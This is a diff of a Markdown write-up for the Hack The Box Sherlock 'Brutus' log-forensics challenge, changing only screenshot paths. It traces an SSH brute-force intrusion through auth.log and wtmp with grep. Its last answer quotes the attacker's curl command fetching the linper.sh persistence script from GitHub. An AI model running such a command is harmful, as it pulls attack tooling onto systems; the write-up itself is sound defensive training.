@@ -1,6 +1,6 @@
 # Brutus HTB
 
-![brutus.png](/BrutusHTB/screenshots/brutus.png)
+![brutus.png](/Brutus/screenshots/brutus.png)
 
 
 # Sherlock Scenario
@@ -24,7 +24,7 @@ Let's open the auth.log file and take a look at what's inside.
 cat auth.log
 ```
 
-![catauth.png](/BrutusHTB/screenshots/catauth.png)
+![catauth.png](/Brutus/screenshots/catauth.png)
 
 Since the attack is a brute-force login attempt, we can filter the ```auth.log``` file using keywords associated with authentication failures and SSH login attempts. Keywords such as ```authentication failure```, ```Failed password```, ```invalid user```, and ```Accepted password``` can be used to identify repeated login attempts and determine whether the attacker eventually gained access to the system.
 Let's try one of them and see what happens:
@@ -32,7 +32,7 @@ Let's try one of them and see what happens:
 ```bash
 grep "authentication failure" auth.log
 ```
-![authfail.png](/BrutusHTB/screenshots/authfail.png)
+![authfail.png](/Brutus/screenshots/authfail.png)
 
 Too many authentication failures from IP address ```65.2.161.68```, which answers our first task.
 
@@ -43,7 +43,7 @@ Let's use the grep command with the keyword "Accepted password" to find successf
 ```bash
 grep "Accepted password" auth.log
 ```
-![accepswd.png](/BrutusHTB/screenshots/accepswd.png)
+![accepswd.png](/Brutus/screenshots/accepswd.png)
 
 Answer: ```root```
 
@@ -59,7 +59,7 @@ Answer: ```root```
 
 In this task, we are searching for the second successful login by the attacker, since the first successful login resulted from a successful brute-force attack. Let's use the two files, ```wtmp``` and ```utmp.py```, that were provided along with the ```auth.log``` file, but before that we need to change the time in the ```utmp.py``` parser to UTC so that it correlates with ```auth.log```.
 
-![toutc.png](/BrutusHTB/screenshots/toutc.png)
+![toutc.png](/Brutus/screenshots/toutc.png)
 
 > UTC (Coordinated Universal Time) is the standard time reference used in many security logs, including ```auth.log```. Correlating events across different logs and systems is much more reliable when all timestamps are in UTC.
 
@@ -73,7 +73,7 @@ python3 utmp.py wtmp | grep "root"
 OR
 python3 utmp.py wtmp | grep "USER"
 ```
-![result.png](/BrutusHTB/screenshots/result.png)
+![result.png](/Brutus/screenshots/result.png)
 
 ## Timeline
 
@@ -88,7 +88,7 @@ Answer: ```2024-03-06 06:32:45```
 
 Returning to the ```auth.log```, we can find the SSH session number after the attacker's second manual login with an accepted password. 
 
-![sessionnumber1.png](/BrutusHTB/screenshots/sessionnumber1.png)
+![sessionnumber1.png](/Brutus/screenshots/sessionnumber1.png)
 
 Answer: ```37```
 
@@ -98,7 +98,7 @@ We can answer this question by searching the ```auth.log``` for some ```sudo``` 
 ```bash
 grep "sudo" auth.log
 ```
-![cyberjunkie.png](/BrutusHTB/screenshots/cyberjunkie.png)
+![cyberjunkie.png](/Brutus/screenshots/cyberjunkie.png)
 
 Answer: ```cyberjunkie```
 
@@ -114,7 +114,7 @@ Let's go back to the ```auth.log``` and search for keywords related to disconnec
 ```bash
 grep "root" auth.log | grep -i "Disconnect"
 ```
-![disconnected.png](/BrutusHTB/screenshots/disconnected.png)
+![disconnected.png](/Brutus/screenshots/disconnected.png)
 
 > Note: The first successful login by the attacker was the result of an automated brute force attempt, and the session was closed within the same second.
 
@@ -128,7 +128,7 @@ Let's search the ```auth.log``` for suspicious commands that the attacker might 
 grep "cyberjunkie" auth.log | grep "sudo"
 ```
 
-![attackercmd.png](/BrutusHTB/screenshots/attackercmd.png)
+![attackercmd.png](/Brutus/screenshots/attackercmd.png)
 
 Answer: ```/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh```
 
@@ -138,4 +138,4 @@ In this Sherlock challenge, we used auth.log and wtmp to track the attacker’s 
 
 This exercise shows how useful system logs are for understanding attacks and tracking what happened step by step. Simple tools like grep and parsers can give a clear picture of how an attacker moved through a system.
 
-![pwned.png](/BrutusHTB/screenshots/pwned.png)
+![pwned.png](/Brutus/screenshots/pwned.png)
